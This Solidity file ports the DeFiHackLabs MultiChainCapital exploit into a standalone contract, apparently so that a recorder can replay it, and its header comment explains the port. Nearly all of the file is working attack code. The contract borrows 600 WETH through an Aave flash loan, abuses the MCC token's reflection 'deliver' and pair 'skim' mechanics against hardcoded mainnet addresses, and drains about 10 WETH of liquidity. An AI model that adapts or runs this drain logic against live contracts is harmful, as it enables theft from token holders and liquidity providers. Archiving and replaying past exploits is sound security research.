// SPDX-License-Identifier: UNLICENSED
// Synthetic, self-contained re-host of the DeFiHackLabs MultiChainCapital exploit
// (registry: 2023-05-MultiChainCapital_exp/test/MultiChainCapital_exp.sol).
//
// The original Foundry test inherits `Test` and runs the whole attack INLINE on the
// harness itself (it holds the Aave flash-loan callback `executeOperation` and the
// UniswapV2 flash callback `uniswapV2Call`, and measures profit on address(this)).
// That harness calls Foundry cheatcodes (createSelectFork / rollFork / log_*), which
// revert outside the Foundry EVM, so the recorder cannot replay it as-is. This file
// copies the attack logic VERBATIM into a standalone contract (no `is Test`, no
// cheatcodes), keeping every numeric constant and call sequence identical so the
// recording is faithful. Entrypoint: run() (≡ testExploit minus cheatcode lines).
//
// Profit is the exploit's own WETH balance delta (the original test asserts
// weth.balanceOf(address(this)) goes 0 → ~10.22 WETH).

pragma solidity ^0.8.10;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IAaveFlashloan {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IMCC is IERC20 {
    function deliver(uint256 amount) external;
    function isExcluded(address account) external returns (bool);
    function isExcludedFromFee(address account) external returns (bool);
    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) external returns (uint256);
    function tokenFromReflection(uint256 rAmount) external returns (uint256);
}

contract MultiChainCapitalDrain {
    IAaveFlashloan aavePool = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IUniswapV2Pair mcc_weth = IUniswapV2Pair(0xDCA79f1f78b866988081DE8a06F92b5e5D316857);
    IMCC mcc = IMCC(0x1a7981D87E3b6a95c1516EB820E223fE979896b3);
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Router router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));

    uint256 amount1000 = 1000 ether;
    address excludedFromFeeAddress = 0xfA21382cDF68ccA1B3A7107a8Cc80688eefBEEBc;
    uint256 rOwned;
    uint256 slot9;
    uint256 rTotal;
    uint256 times;

    // Entrypoint (≈ testExploit with cheatcode lines removed).
    function run() public {
        weth.approve(address(aavePool), type(uint256).max);
        aavePool.flashLoanSimple(address(this), address(weth), 600 ether, new bytes(1), 0);
    }

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256 amountIn) {
        require(amountOut > 0, "UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT");
        require(reserveIn > 0 && reserveOut > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        amountIn = (numerator / denominator) + 1;
    }

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256 amountOut) {
        require(amountIn > 0, "UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT");
        require(reserveIn > 0 && reserveOut > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
        amountOut = numerator / denominator;
    }

    function executeOperation(
        address, /*asset*/
        uint256, /*amount*/
        uint256, /*premium*/
        address, /*initator*/
        bytes calldata /*params*/
    ) external payable returns (bool) {
        times = 2;
        (uint256 reserve0, uint256 reserve1,) = mcc_weth.getReserves();
        uint256 amountIn = getAmountIn(amount1000 / 100_000 * 10_001, reserve1, reserve0);
        weth.transfer(address(mcc_weth), amountIn);
        mcc_weth.swap(amount1000 / 100_000 * 10_001, 0, address(this), new bytes(0));
        mcc.transfer(excludedFromFeeAddress, 1);
        rTotal = mcc.reflectionFromToken(amount1000, false);
        uint256 attackerBalance = mcc.balanceOf(address(this));
        uint256 attackerROwned = mcc.reflectionFromToken(attackerBalance, false);
        rOwned = attackerROwned;
        times = 2;
        func1f46(10, 1033);

        attackerBalance = mcc.balanceOf(address(this));
        attackerROwned = mcc.reflectionFromToken(attackerBalance, false);
        rOwned = attackerROwned;
        func1f46(10, 1034);

        attackerBalance = mcc.balanceOf(address(this));
        attackerROwned = mcc.reflectionFromToken(attackerBalance, false);
        rOwned = attackerROwned;
        func1f46(10, 1035);

        attackerBalance = mcc.balanceOf(address(this));
        attackerROwned = mcc.reflectionFromToken(attackerBalance, false);
        rOwned = attackerROwned;
        func1f46(10, 1036);
        func1f46(10, 1069);
        func1f46(10, 1046);
        func1f46(4, 1018);
        func21b0(10_000);

        rTotal = mcc.reflectionFromToken(amount1000, false);
        func1f46(10, 1095);
        func1f46(10, 1081);
        func1f46(10, 1066);
        func1f46(10, 1049);
        func1f46(10, 1029);
        func21b0(5000);

        rTotal = mcc.reflectionFromToken(amount1000, false);
        func1f46(10, 1049);
        func1f46(10, 1037);
        func1f46(10, 1023);
        func21b0(500);

        rTotal = mcc.reflectionFromToken(amount1000, false);
        func1f46(6, 1012);

        (reserve0, reserve1,) = mcc_weth.getReserves();
        amountIn = getAmountIn(reserve0 * 9003 / 10_000, reserve1, reserve0);
        weth.transfer(address(mcc_weth), amountIn);
        mcc_weth.swap(reserve0 * 9003 / 10_000, 0, excludedFromFeeAddress, new bytes(0));

        for (uint256 i = 0; i < 15; i++) {
            func1d89(900);
        }

        mcc.approve(address(this), type(uint256).max);
        mcc.transferFrom(address(this), excludedFromFeeAddress, 1);
        for (uint256 i = 0; i < 15; i++) {
            func1d89(900);
        }

        mcc.transferFrom(address(this), excludedFromFeeAddress, 1);
        for (uint256 i = 0; i < 15; i++) {
            func1d89(900);
        }

        mcc.transferFrom(address(this), excludedFromFeeAddress, 1);
        for (uint256 i = 0; i < 7; i++) {
            func1d89(900);
        }

        func1d89(500);
        func1d89(500);
        func1d89(500);
        func1d89(50);
        func19c(900);
        func19c(300);
        func19c(100);
        func19c(20);

        uint256 pairBalance = mcc.balanceOf(address(mcc_weth));
        (reserve0, reserve1,) = mcc_weth.getReserves();
        uint256 amountOut = getAmountOut(pairBalance - reserve0, reserve0, reserve1);
        mcc_weth.swap(0, amountOut, address(this), new bytes(0));
        return true;
    }

    function func1f46(uint256 v0, uint256 v1) internal {
        slot9 = v1;
        uint256 v3 = mcc.tokenFromReflection(rTotal / 100 * v0);
        mcc_weth.swap(v3, 0, address(this), new bytes(1));
        mcc.transfer(excludedFromFeeAddress, 1);
    }

    function func21b0(
        uint256 v0
    ) internal {
        (uint256 reserve0, uint256 reserve1,) = mcc_weth.getReserves();
        uint256 amountIn = getAmountIn(amount1000 / 100_000 * v0, reserve1, reserve0);
        weth.transfer(address(mcc_weth), amountIn);
        mcc_weth.swap(amount1000 / 100_000 * v0, 0, address(this), new bytes(0));
        mcc.transfer(excludedFromFeeAddress, 1);
    }

    function func1d89(
        uint256 v0
    ) internal {
        mcc.deliver(amount1000 * v0 / 1000);
        mcc_weth.skim(excludedFromFeeAddress);
    }

    function func19c(
        uint256 v0
    ) internal {
        mcc.deliver(amount1000 * v0 / 1000);
    }

    function uniswapV2Call(
        address, /*sender*/
        uint256, /*amount0*/
        uint256, /*amount1*/
        bytes calldata /*data*/
    ) external {
        if (times > 5) {
            if (times <= 25) {
                uint256 pairBalance = mcc.balanceOf(address(mcc_weth));
                (uint256 reserve0,,) = mcc_weth.getReserves();
                mcc.deliver((reserve0 - pairBalance) * slot9 / 1000);
                times += 1;
            }
        } else {
            uint256 attackerBalance = mcc.balanceOf(address(this));
            uint256 v14 = mcc.reflectionFromToken(attackerBalance, false);
            uint256 v17 = mcc.tokenFromReflection(v14 - rOwned);
            mcc.deliver(v17);
            uint256 pairBalance = mcc.balanceOf(address(mcc_weth));
            (uint256 reserve0, uint256 reserve1,) = mcc_weth.getReserves();
            uint256 amountIn = getAmountIn(reserve0 - pairBalance, reserve1, reserve0);
            weth.transfer(address(mcc_weth), amountIn * slot9 / 1000);
            times += 1;
        }
    }
}
